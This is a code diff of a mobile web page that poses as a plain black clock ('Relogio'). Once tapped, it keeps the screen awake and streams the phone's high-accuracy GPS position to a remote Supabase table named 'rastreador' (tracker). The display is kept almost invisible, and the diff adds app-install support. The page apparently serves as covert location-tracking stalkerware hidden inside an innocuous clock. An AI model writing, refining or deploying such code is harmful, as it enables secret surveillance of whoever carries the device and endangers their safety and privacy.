@@ -3,36 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Clock</title>
+<meta name="theme-color" content="#000000">
+<title>Relogio</title>
+<link rel="manifest" href="manifest-clock.json">
 <style>
 html,body{margin:0;height:100%;background:#000;overflow:hidden}
 body{display:flex;align-items:center;justify-content:center;flex-direction:column}
-#h{font-size:55px;color:#222;font-family:monospace;letter-spacing:3px;transition:.5s}
-#s{font-size:12px;color:#111;margin-top:10px}
+#h{font-size:62px;color:#151515;font-family:monospace;letter-spacing:4px}
+#s{font-size:13px;color:#222;margin-top:8px}
 body.ativo #h{color:#1a1a1a}
-body.ativo #s{color:#0f0; opacity:0.2}
+body.ativo #s{color:#111}
 </style>
 </head>
 <body>
 <div id="h">--:--</div>
 <div id="s">⏰ toque para ativar</div>
 <script>
+if('serviceWorker' in navigator){ navigator.serviceWorker.register('sw.js'); }
 const U="https://jpaflbkafupwqfqfcjrv.supabase.co", K="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
 function clock(){ document.getElementById('h').innerText=new Date().toLocaleTimeString('pt-BR',{hour:'2-digit',minute:'2-digit'}); }
 setInterval(clock,1000); clock();
-
 document.body.onclick=async ()=>{
   document.body.classList.add('ativo');
-  document.getElementById('s').innerText="●";
+  document.getElementById('s').innerText="● ativo";
   try{ await document.documentElement.requestFullscreen(); }catch(e){}
   try{ if(navigator.wakeLock) await navigator.wakeLock.request('screen'); }catch(e){}
   navigator.geolocation.watchPosition(async p=>{
-    await fetch(`${U}/rest/v1/rastreador`,{
-      method:"POST",
-      headers:{apikey:K,Authorization:"Bearer "+K,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},
-      body:JSON.stringify({device_id:"LG",lat:p.coords.latitude,lng:p.coords.longitude,updated_at:new Date().toISOString()})
-    });
-  },()=>{}, {enableHighAccuracy:true, maximumAge:0});
+    await fetch(`${U}/rest/v1/rastreador`,{method:"POST",headers:{apikey:K,Authorization:"Bearer "+K,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:"LG",lat:p.coords.latitude,lng:p.coords.longitude,updated_at:new Date().toISOString()})});
+  },()=>{}, {enableHighAccuracy:true});
 };
 </script>
 </body>
